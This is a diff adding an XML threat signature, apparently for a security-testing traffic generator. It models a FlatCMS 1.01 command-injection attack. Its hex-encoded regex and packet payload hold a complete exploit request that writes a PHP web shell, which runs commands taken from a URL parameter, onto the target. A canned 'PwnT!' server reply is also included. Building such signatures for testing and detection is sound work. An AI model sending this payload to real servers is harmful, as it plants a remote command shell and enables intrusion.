@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="FlatCMS Command Injection"/>
+    <EngDesc display="true" value="This threat exploits a flaw in the FlatCMS application that allows an attacker to inject arbitrary commands into the Applications script.  FlatCMS is a web application that typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="FlatCMS"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="FlatCMS_FlatCMS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="FlatCMS_FlatCMS_1.01"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/id.php?id=1405"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000108a3433aee00c000a80001003c5068551c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value=""/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725918810312500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X2F\X61\X64\X6D\X69\X6E\X2F\X66\X69\X6C\X65\X5F\X65\X64\X69\X74\X6F\X72\X2E\X70\X68\X70\X3F\X73\X61\X76\X65\X5F\X66\X69\X6C\X65\X3D\X63\X69\X6A\X66\X65\X72\X2E\X70\X68\X70\X26\X66\X5F\X63\X6F\X6E\X74\X65\X6E\X74\X3D\X25\X33\X43\X25\X33\X46\X25\X32\X34\X68\X61\X6E\X64\X6C\X65\X25\X33\X44\X70\X6F\X70\X65\X6E\X25\X35\X43\X25\X32\X38\X25\X32\X34\X5F\X47\X45\X54\X25\X35\X42\X63\X69\X6A\X25\X35\X44\X25\X32\X43\X25\X32\X32\X72\X25\X32\X32\X25\X32\X39\X25\X33\X42\X77\X68\X69\X6C\X65\X25\X32\X38\X25\X32\X31\X66\X65\X6F\X66\X25\X32\X38\X25\X32\X34\X68\X61\X6E\X64\X6C\X65\X25\X32\X39\X25\X32\X39\X25\X37\X42\X25\X32\X34\X6C\X69\X6E\X65\X25\X33\X44\X66\X67\X65\X74\X73\X25\X32\X38\X25\X32\X34\X68\X61\X6E\X64\X6C\X65\X25\X32\X39\X25\X33\X42\X69\X66\X25\X32\X38\X73\X74\X72\X6C\X65\X6E\X25\X32\X38\X25\X32\X34\X6C\X69\X6E\X65\X25\X32\X39\X25\X33\X45\X25\X33\X44\X31\X25\X32\X39\X25\X37\X42\X65\X63\X68\X6F\X25\X32\X32\X25\X32\X34\X6C\X69\X6E\X65\X25\X32\X32\X25\X33\X42\X25\X37\X44\X25\X37\X44\X70\X63\X6C\X6F\X73\X65\X25\X32\X38\X25\X32\X34\X68\X61\X6E\X64\X6C\X65\X25\X32\X39\X25\X33\X42\X25\X33\X46\X25\X33\X45\X20\X48\X54\X54\X50\X2F\X31\X2E\X31\X0D\X0A\X54\X45\X3A\X20\X64\X65\X66\X6C\X61\X74\X65\X2C\X67\X7A\X69\X70\X3B\X71\X3D\X30\X2E\X33\X0D\X0A\X43\X6F\X6E\X6E\X65\X63\X74\X69\X6F\X6E\X3A\X20\X54\X45\X2C\X20\X63\X6C\X6F\X73\X65\X0D\X0A\X48\X6F\X73\X74\X3A\X20\X31\X39\X32\X2E\X31\X36\X38\X2E\X33\X2E\X31\X0D\X0A\X55\X73\X65\X72\X2D\X41\X67\X65\X6E\X74\X3A\X20\X4D\X6F\X7A\X69\X6C\X6C\X61\X2F\X35\X2E\X30\X20\X5B\X65\X6E\X5D\X20\X28\X58\X31\X31\X3B\X20\X49\X3B\X20\X53\X75\X6E\X4F\X53\X20\X35\X2E\X36\X20\X73\X75\X6E\X34\X75\X29\X0D\X0A\X0D\X0A"/>
+    <Created value="1139461729" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F2F61646D696E2F66696C655F656469746F722E7068703F736176655F66696C653D63696A6665722E70687026665F636F6E74656E743D25334325334625323468616E646C65253344706F70656E2535432532382532345F47455425354263696A253544253243253232722532322532392533427768696C6525323825323166656F6625323825323468616E646C652532392532392537422532346C696E65253344666765747325323825323468616E646C6525323925334269662532387374726C656E2532382532346C696E65253239253345253344312532392537426563686F2532322532346C696E6525323225334225374425374470636C6F736525323825323468616E646C6525323925334225334625334520485454502F312E310D0A54453A206465666C6174652C677A69703B713D302E330D0A436F6E6E656374696F6E3A2054452C20636C6F73650D0A486F73743A203139322E3136382E332E310D0A557365722D4167656E743A204D6F7A696C6C612F352E30205B656E5D20285831313B20493B2053756E4F5320352E362073756E3475290D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
